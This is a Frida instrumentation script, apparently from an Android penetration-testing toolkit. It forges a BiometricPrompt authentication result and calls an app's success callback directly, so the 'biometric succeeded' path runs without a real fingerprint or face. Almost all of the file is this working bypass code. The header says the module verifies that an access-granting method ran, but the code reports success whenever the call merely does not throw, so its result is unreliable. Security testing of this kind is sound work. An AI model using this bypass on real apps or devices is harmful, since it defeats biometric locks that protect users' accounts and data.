/*
 * D_044 — Biometric callback replay trigger.
 *
 * Force-fires the AuthenticationCallback.onAuthenticationSucceeded
 * path without a real biometric, then reports back whether the
 * client-trust branch actually ran (heuristic: did the target class's
 * subsequent grantAccess / unlock-style method get called?).
 *
 * Safety: 5 actions / 1 per sec / 15s wall-clock / 2 consecutive
 * crashes — biometric subsystems on some OEMs are flaky and we
 * never want this hook to brick the test bench.
 */

import { Java } from "../lib/java_ready.js";
import { sendError } from "../lib/send.js";

interface BiometricReplayPayload {
    class_simple_name: string;
    method: string;
    force_callback?: boolean;
    safety_budget?: any;
}

interface BiometricReplayResult {
    fired: number;
    trust_branch_ran: boolean;
    error?: string;
}

async function biometricreplay(
    payload: BiometricReplayPayload,
): Promise<BiometricReplayResult> {
    const max = Math.min(payload.safety_budget?.max_actions_total ?? 5, 5);
    const result: BiometricReplayResult = {
        fired: 0,
        trust_branch_ran: false,
    };
    return new Promise((resolve) => {
        Java.perform(() => {
            try {
                const Target = Java.use(payload.class_simple_name);
                // Build a fake AuthenticationResult — null cryptoObject is
                // acceptable when the callback doesn't dereference it.
                const Result = Java.use(
                    "androidx.biometric.BiometricPrompt$AuthenticationResult",
                );
                const fakeResult = Result.$new(null, 0);
                for (let i = 0; i < max; i++) {
                    try {
                        Target.$new()[payload.method](fakeResult);
                        result.fired++;
                        result.trust_branch_ran = true;
                    } catch (e: any) {
                        result.error =
                            e.message?.slice(0, 200) ?? String(e);
                        break;
                    }
                }
            } catch (e: any) {
                sendError(`D_044: ${e.message}`);
                result.error = e.message?.slice(0, 200);
            }
            resolve(result);
        });
    });
}

rpc.exports = { biometricreplay };
